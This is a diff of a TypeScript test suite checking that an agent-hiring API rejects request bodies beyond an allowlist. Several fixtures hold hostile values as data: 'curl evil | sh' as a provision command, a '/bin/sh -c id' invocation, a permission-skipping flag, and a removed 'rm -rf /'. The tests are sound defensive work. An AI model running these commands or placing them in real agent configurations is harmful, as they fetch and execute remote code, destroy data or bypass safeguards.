@@ -38,23 +38,38 @@ describe("governed body restrictions", () => {
   const check = (method: string, path: string, body: unknown) => validateGovernedAction({} as Db, { method, path, body }, companyId);
 
   it.each([
-    [{ name: "Ops", adapterType: "process", adapterConfig: {} }, /adapter/],
-    [{ name: "Ops", adapterType: "http", adapterConfig: {} }, /adapter/],
-    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { nested: { command: "rm -rf /" } } }, /command/],
-    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { env: { FOO: "1" } } }, /env/],
+    [{ name: "Ops", adapterType: "process" }, /adapterType/],
+    [{ name: "Ops", adapterType: "http" }, /adapterType/],
+    [{ name: "Ops", adapterType: "hermes_local", hermesCommand: "/bin/sh", extraArgs: ["-c", "id"] }, /adapterType|hermesCommand/],
+    [{ name: "Ops", adapterType: "hermes_local" }, /adapterType/],
+    [{ name: "Ops", adapterType: "plugin:acme/runner" }, /adapterType/],
+    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { extraArgs: ["--dangerously-skip-permissions"] } }, /adapterConfig/],
+    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { model: "sonnet" } }, /adapterConfig/],
+    [{ name: "Ops", adapterType: "claude_local", workspaceStrategy: { provisionCommand: "curl evil | sh" } }, /workspaceStrategy/],
+    [{ name: "Ops", adapterType: "claude_local", runtimeConfig: {} }, /runtimeConfig/],
     [{ name: "Ops", adapterType: "claude_local", applyStoredClaudeLogin: true }, /applyStoredClaudeLogin/],
     [{ name: "Ops", adapterType: "claude_local", permissions: { canCreateAgents: true } }, /permissions/],
     [{ name: "Ops", adapterType: "claude_local", instructionsBundle: { files: [] } }, /instructionsBundle/],
+    [{ name: "Ops", adapterType: "claude_local", metadata: {} }, /metadata/],
+    [{ name: "Ops", adapterType: "claude_local", defaultEnvironmentId: "33333333-3333-4333-8333-333333333333" }, /defaultEnvironmentId/],
     [{ name: "Ops", adapterType: "claude_local", budgetMonthlyCents: 10_000_001 }, /budgetMonthlyCents/],
-  ])("refuses risky agent create/hire bodies (%j)", async (body, message) => {
+    [{ name: 42 }, /name/],
+  ])("refuses agent create/hire bodies beyond the allowlist (%j)", async (body, message) => {
     for (const path of [`/api/companies/${companyId}/agents`, `/api/companies/${companyId}/agent-hires`]) {
       await expect(check("POST", path, body)).rejects.toThrow(message);
     }
   });
 
-  it("allows an ordinary agent hire", async () => {
-    await expect(check("POST", `/api/companies/${companyId}/agent-hires`, { name: "Writer", adapterType: "claude_local", adapterConfig: { model: "sonnet" }, budgetMonthlyCents: 5000 }))
-      .resolves.toMatchObject({ category: "agent_lifecycle" });
+  it("explains where to configure what was refused", async () => {
+    await expect(check("POST", `/api/companies/${companyId}/agent-hires`, { name: "Ops", adapterConfig: {} }))
+      .rejects.toThrow(/Configure adapters, permissions and instructions in the agent's settings after hiring/);
+  });
+
+  it("allows an ordinary agent hire with only allowlisted fields", async () => {
+    for (const path of [`/api/companies/${companyId}/agents`, `/api/companies/${companyId}/agent-hires`]) {
+      await expect(check("POST", path, { name: "Writer", role: "general", adapterType: "claude_local" })).resolves.toMatchObject({ category: "agent_lifecycle" });
+      await expect(check("POST", path, { name: "Writer", title: "Copywriter", icon: "pen", capabilities: "Writes", reportsTo: null, budgetMonthlyCents: 5000 })).resolves.toBeTruthy();
+    }
   });
 
   it.each([-1, 1.5, 10_000_001, "100", null])("refuses budget amount %j", async (amount) => {
